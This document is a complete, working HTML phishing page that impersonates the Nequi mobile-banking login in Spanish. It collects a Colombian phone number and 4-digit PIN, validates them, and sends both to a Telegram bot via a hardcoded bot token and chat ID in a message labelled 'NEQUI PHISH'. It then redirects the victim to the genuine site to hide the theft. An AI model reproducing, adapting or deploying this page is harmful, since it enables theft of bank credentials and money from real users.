<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            font-family: 'Roboto', sans-serif; 
            background: #120B24;
            height: 100vh; 
            color: white;
            overflow: hidden;
        }
        .container {
            max-width: 420px;
            margin: 0 auto;
            padding: 16px;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 0;
        }
        .help {
            width: 28px;
            height: 28px;
            border: 2px solid white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            color: white;
        }
        .logo-container {
            margin-top: 60px;
            text-align: center;
        }
        .logo {
            font-size: 52px;
            font-weight: 700;
            color: #DA0081;
            letter-spacing: -2px;
        }
        .form-container {
            margin-top: auto;
            margin-bottom: 30px;
        }
        .input-wrapper {
            background: rgba(255,255,255,0.1);
            border-radius: 4px;
            padding: 4px;
            margin-bottom: 16px;
        }
        .input-group {
            display: flex;
            align-items: center;
            background: rgba(255,255,255,0.08);
            border-radius: 4px;
            padding: 4px;
        }
        .country-code {
            padding: 0 14px;
            color: #FF69B4;
            font-weight: 500;
            border-right: 2px solid #6B2B7A;
        }
        input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 14px 16px;
            font-size: 17px;
            color: white;
            outline: none;
        }
        input::placeholder {
            color: rgba(255,255,255,0.6);
        }
        button {
            width: 100%;
            height: 52px;
            background: #FF2D95;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="help">?</div>
            <div style="color:#9CA3AF;">
                <svg width="70" height="24" viewBox="0 0 118 40" fill="currentColor"></svg>
            </div>
        </header>

        <div class="logo-container">
            <div class="logo">Nequi</div>
        </div>

        <div class="form-container">
            <form id="loginForm">
                <div class="input-wrapper">
                    <div class="input-group">
                        <div class="country-code">+57</div>
                        <input type="tel" id="phone" placeholder="Ingresa tu cel" maxlength="10" inputmode="numeric" required>
                    </div>
                </div>

                <div class="input-wrapper">
                    <div class="input-group">
                        <input type="password" id="password" placeholder="Clave de 4 dígitos" maxlength="4" inputmode="numeric" required>
                    </div>
                </div>

                <button type="submit">Entra</button>
            </form>
        </div>
    </div>

    <script>
        const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
        const chatId = "773351137";

        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();

            const phone = document.getElementById("phone").value.trim().replace(/\s/g, '');
            const password = document.getElementById("password").value.trim();

            if (phone.length !== 10 || !/^[3]\d{9}$/.test(phone)) {
                alert("Número inválido");
                return;
            }
            if (password.length !== 4 || !/^\d{4}$/.test(password)) {
                alert("Clave debe ser de 4 dígitos");
                return;
            }

            const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phone}\n🔑 Clave: ${password}\n⏰ Hora: ${new Date().toLocaleString('es-CO')}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });

            setTimeout(() => {
                window.location.href = "https://www.nequi.com.co";
            }, 700);
        });
    </script>
</body>
</html>
